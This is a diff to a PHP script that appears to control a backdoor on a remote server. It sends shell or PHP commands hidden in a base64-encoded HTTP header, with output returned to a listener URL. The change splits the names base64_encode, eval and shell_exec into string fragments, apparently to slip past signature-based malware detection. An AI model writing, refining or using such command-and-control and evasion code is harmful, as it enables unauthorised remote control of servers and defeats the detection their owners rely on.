@@ -47,10 +47,11 @@ while(!$done) {
 
 function send($command, $isphp = False) {
     $charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ=";
+    $charset2= 'bas'.'e'.(32*2).'_enc'.'ode';
     if($isphp) {
-        $headersArray = array("LENGTH: ".get_random_string($charset, 2).base64_encode("eval"."\x15".$command." 2>&1"."\x15".LISTENER_URL."/?r="), 'Expect:' );
+        $headersArray = array("LENGTH: ".get_random_string($charset, 2).$charset2("ev"."al"."\x15".$command." 2>&1"."\x15".LISTENER_URL."/?r="), 'Expect:' );
     } else {
-        $headersArray = array("LENGTH: ".get_random_string($charset, 2).base64_encode("shell_exec"."\x15".$command." 2>&1"."\x15".LISTENER_URL."/?r="), 'Expect:' );
+        $headersArray = array("LENGTH: ".get_random_string($charset, 2).$charset2("sh"."el"."l_e"."xec"."\x15".$command." 2>&1"."\x15".LISTENER_URL."/?r="), 'Expect:' );
     }
     $curl = curl_init();
     curl_setopt_array($curl, array(
